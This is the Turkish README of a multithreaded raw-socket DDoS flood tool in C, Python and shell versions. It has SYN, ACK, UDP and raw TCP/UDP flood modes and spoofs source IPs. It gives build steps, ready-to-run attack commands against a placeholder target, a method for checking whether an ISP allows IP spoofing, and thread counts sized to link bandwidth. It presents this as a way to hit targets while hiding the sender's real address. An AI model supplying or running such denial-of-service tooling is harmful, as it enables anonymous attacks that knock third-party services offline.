# flood — made by dupewon

raw socket flood tool. syn, ack, udp, rawtcp, rawudp. spoofed source ip. multithreaded.

---

## gereksinimler

- linux (ubuntu, debian, centos, herhangi bir distro)
- gcc (c versiyonu için)
- python3 (py versiyonu için)
- root yetkisi (raw socket = sudo şart)
- spoof hat (source ip spoofing için ISP'nin BCP38 filtrelememesi lazım)

---

## derleme

```bash
gcc -O2 -pthread -o flood flood.c
```

veya otomatik:

```bash
chmod +x flood.sh
```

---

## kullanım

```
./flood <ip> <port> <metod> <thread> <süre>
```

| parametre | açıklama |
|-----------|----------|
| ip | hedef ip adresi |
| port | hedef port |
| metod | syn / ack / udp / rawtcp / rawudp |
| thread | kaç thread açılacak (1-1024) |
| süre | saniye cinsinden süre, 0 = sonsuz |

---

## metodlar

| metod | ne yapar |
|-------|----------|
| syn | SYN flood, half-open connection tüketir |
| ack | ACK flood, stateful firewall bypass |
| udp | UDP flood, 512-1400 byte random payload |
| rawtcp | random TCP flag kombinasyonları (SYN, ACK, FIN, RST, PSH, URG, NULL, XMAS) |
| rawudp | max payload UDP flood (1472 byte), bandwidth odaklı |

---

## örnekler

### spoof hatlı kullanım (source ip random)

spoof destekleyen hatta her paket farklı random source ip ile gider. hedef tarafında gerçek ip'n gözükmez.

```bash
# syn flood, 200 thread, 60 saniye
sudo ./flood 1.2.3.4 80 syn 200 60

# udp flood, 500 thread, sonsuz (ctrl+c ile durdur)
sudo ./flood 1.2.3.4 53 udp 500 0

# rawtcp, 300 thread, 120 saniye
sudo ./flood 1.2.3.4 443 rawtcp 300 120

# rawudp max bandwidth, 400 thread, 90 saniye
sudo ./flood 1.2.3.4 80 rawudp 400 90

# ack flood, 250 thread, 45 saniye
sudo ./flood 1.2.3.4 80 ack 250 45
```

### source ip'siz hat (tekil hat)

tekil hatlarda da aynı şekilde çalıştırırsın. komut aynı. fark şu:

- tool yine random source ip koyar pakete
- ama ISP çıkışta BCP38 filtresi varsa, kendi ip'n dışındaki source'lu paketleri droplar
- yani paketler gider ama ISP tarafında düşer

```bash
# aynı komut, tekil hatta da böyle çalıştırırsın
sudo ./flood 1.2.3.4 80 syn 200 60
```

tekil hatta spoof çalışıp çalışmadığını test etmek için:
- az thread ile başla (10-20)
- tcpdump ile karşı tarafta paket gelip gelmediğine bak
- geliyorsa hat spoof destekliyor

---

## python versiyonu

c versiyonundan yavaş ama bağımlılık yok, direkt çalışır.

```bash
sudo python3 flood.py 1.2.3.4 80 syn 100 60
sudo python3 flood.py 1.2.3.4 53 udp 50 0
sudo python3 flood.py 1.2.3.4 443 rawtcp 80 120
```

python max thread: 512. ciddi iş için c versiyonunu kullan.

---

## shell wrapper

flood.sh otomatik derler ve çalıştırır. gcc yoksa veya ilk defa çalıştırıyorsan:

```bash
chmod +x flood.sh
sudo ./flood.sh 1.2.3.4 80 syn 200 60
```

thread default: 100, süre default: 30 saniye.

```bash
# sadece ip port metod versen yeter
sudo ./flood.sh 1.2.3.4 80 syn
```

---

## thread sayısı önerisi

| hat tipi | önerilen thread |
|----------|----------------|
| 100mbps | 50-100 |
| 1gbps | 200-400 |
| 10gbps | 500-1024 |

fazla thread = fazla cpu kullanımı. sunucunun cpu'suna göre ayarla.

---

## çıktı

çalışırken canlı stats gösterir:

```
  [*] elapsed: 12s | packets: 1,542,891 | pps: 128,574
```

bitince:

```
  [+] attack finished. total packets: 7,714,455
```

---

## dosyalar

| dosya | açıklama |
|-------|----------|
| flood.c | ana kaynak, c versiyonu |
| flood.py | python versiyonu |
| flood.sh | otomatik derle + çalıştır |

---

## notlar

- raw socket root gerektirir, sudo olmadan çalışmaz
- spoof hatlarda source ip random, tekil hatlarda ISP'ye bağlı
- c versiyonu python'dan 10-50x daha hızlı
- ctrl+c ile istediğin zaman durdurabilirsin
- süre 0 verirsen sonsuz çalışır
